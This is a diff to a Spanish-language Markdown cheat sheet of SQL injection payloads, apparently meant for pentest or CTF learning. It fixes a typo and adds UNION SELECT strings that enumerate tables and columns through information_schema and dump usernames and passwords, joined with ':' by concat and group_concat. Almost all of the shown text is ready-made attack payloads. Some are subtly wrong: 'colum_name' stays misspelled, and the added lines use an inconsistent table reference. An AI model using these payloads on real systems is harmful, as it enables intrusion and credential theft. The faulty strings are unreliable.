@@ -45,7 +45,12 @@ Acceder a las tablas de una de las bases de datos existentes
 `' union select 1,table_name from information_schema.tables where table_schema='nombrebbdd'-- -`
 
 Enumerar las columnas de una de las tablas de la base de datos existente
-`' union select 1,colum_name from information_schema.columns where table_schema='nombrebbdd' adn table_name='nombretabla'-- -`
+`' union select 1,colum_name from information_schema.columns where table_schema='nombrebbdd' and table_name='nombretabla'-- -`
 
 Seleccionar los campos de las columnas de una tabla de una base de datos existente
-`' union select username,password from information_schema.columns where table_schema='nombrebbdd' adn table_name='nombretabla'-- -`
+`' union select username,password from nombrebbdd.nombretabla-- -`
+
+También se pude jugar con concat o group_concat (0x3a hace referencia a ':' )
+`' union select 1,concat(username,0x3a,password) from nombretabla.nombrecolumna-- -`
+`' union select 1,group_concat(username,0x3a,password) from nombretabla.nombrecolumna-- -`
+
